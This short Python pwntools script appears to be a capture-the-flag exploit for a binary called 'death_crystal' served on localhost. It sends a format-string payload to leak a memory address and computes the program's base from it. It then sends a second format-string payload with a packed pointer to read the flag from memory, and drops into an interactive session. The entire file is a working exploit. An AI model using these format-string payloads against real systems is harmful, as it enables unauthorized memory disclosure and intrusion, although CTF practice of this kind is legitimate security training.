from pwn import *
import time

ip = "localhost"
port = 10000

r = remote(ip, port)
# r = process("./death_crystal")

context.arch = "amd64"

payload = "%d" * 11 + ".%llu"
r.sendlineafter(":", payload)

r.recvline()
code_base = int(r.recvline().split(".")[1]) - 0xb20
info("code base: {}".format(hex(code_base)))

flag = code_base + 0x202060
payload = flat("%d" * 8, ".%s.aaaa", p64(flag))
r.sendlineafter(":", payload)

r.interactive()
